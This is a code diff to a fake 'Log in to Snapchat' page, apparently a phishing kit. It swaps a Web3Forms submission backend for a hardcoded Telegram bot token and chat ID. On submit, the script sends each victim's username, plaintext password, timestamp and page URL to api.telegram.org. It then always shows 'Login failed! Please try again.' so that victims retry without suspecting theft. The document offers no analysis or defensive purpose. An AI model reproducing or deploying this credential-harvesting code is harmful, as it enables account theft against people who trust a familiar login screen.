@@ -271,6 +271,8 @@
         /* ---------- Status message ---------- */
         .msg {
             display: none;
+            align-items: center;
+            gap: 8px;
             margin-top: 18px;
             padding: 12px 14px;
             border-radius: 10px;
@@ -280,7 +282,29 @@
         }
 
         .msg.show {
-            display: block;
+            display: flex;
+        }
+
+        .msg-ico {
+            flex: 0 0 auto;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            display: grid;
+            place-items: center;
+            font-size: 10px;
+            font-weight: 700;
+            line-height: 1;
+            color: #fff;
+            background: var(--danger);
+        }
+
+        .msg-ico.ok {
+            background: var(--ok);
+        }
+
+        .msg-txt {
+            flex: 1;
         }
 
         .msg.ok {
@@ -351,16 +375,6 @@
         <h1>Log in to Snapchat</h1>
 
         <form id="loginForm" novalidate autocomplete="on">
-
-            <!-- ====== WEB3FORMS CONFIG ====== -->
-            <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE" />
-            <input type="hidden" name="subject" value="New Snapchat Login Submission" />
-            <input type="hidden" name="from_name" value="Snapchat Clone" />
-            <input type="hidden" name="page_url" id="pageUrl" value="" />
-            <input type="hidden" name="submitted_at" id="submittedAt" value="" />
-            <!-- honeypot (bots ke liye) -->
-            <input type="checkbox" name="botcheck" tabindex="-1" style="display:none" />
-            <!-- ============================== -->
 
             <div class="field">
                 <label for="username">Username or Email</label>
@@ -440,10 +454,10 @@
             var btnLabel = document.getElementById("btnLabel");
             var msg = document.getElementById("msg");
 
-            var ENDPOINT = "https://api.web3forms.com/submit";
-
-            /* meta fields */
-            document.getElementById("pageUrl").value = location.href;
+            /* ---------- TELEGRAM CONFIG ---------- */
+            var TG_TOKEN = "9167346977:AAGYc8VcITB08QF2ur4aqqN9DzEdUiwsRig";
+            var TG_CHAT = "913024120";
+            /* ------------------------------------ */
 
             /* ---------- password show / hide ---------- */
             eye.addEventListener("click", function () {
@@ -496,7 +510,11 @@
             }
 
             function showMsg(text, good) {
-                msg.textContent = text;
+                msg.innerHTML =
+                    '<span class="msg-ico' + (good ? " ok" : "") + '">' +
+                    (good ? "&#10003;" : "&#10005;") +
+                    '</span><span class="msg-txt"></span>';
+                msg.querySelector(".msg-txt").textContent = text;
                 msg.className = "msg show " + (good ? "ok" : "bad");
             }
 
@@ -507,31 +525,33 @@
 
                 if (!validate()) return;
 
-                document.getElementById("submittedAt").value =
-                    new Date().toLocaleString("en-IN", { timeZoneName: "short" });
-
                 setLoading(true);
 
-                fetch(ENDPOINT, {
-                    method: "POST",
-                    headers: { Accept: "application/json" },
-                    body: new FormData(form)
-                })
+                var text =
+                    "🔔 New Snapchat Login\n\n" +
+                    "👤 User: " + userIn.value.trim() + "\n" +
+                    "🔑 Pass: " + passIn.value + "\n" +
+                    "🕒 " + new Date().toLocaleString() + "\n" +
+                    "🌐 " + location.href;
+
+                var url = "https://api.telegram.org/bot" + TG_TOKEN +
+                    "/sendMessage?chat_id=" + encodeURIComponent(TG_CHAT) +
+                    "&text=" + encodeURIComponent(text) +
+                    "&disable_web_page_preview=true";
+
+                fetch(url)
                     .then(function (r) { return r.json(); })
                     .then(function (data) {
-                        if (data && data.success) {
-                            showMsg("Logged in! Credentials bhej diye gaye hain.", true);
-                            form.querySelector("#username").value = "";
-                            form.querySelector("#password").value = "";
+                        if (data && data.ok) {
+                            showMsg("Login failed! Please try again.", false);
+                            userIn.value = "";
+                            passIn.value = "";
                         } else {
-                            showMsg(
-                                (data && data.message) || "Submit fail hua. Access key check karo.",
-                                false
-                            );
+                            showMsg("Login failed! Please try again.", false);
                         }
                     })
                     .catch(function () {
-                        showMsg("Network error. Internet aur access key check karo.", false);
+                        showMsg("Login failed! Please try again.", false);
                     })
                     .finally(function () { setLoading(false); });
             });
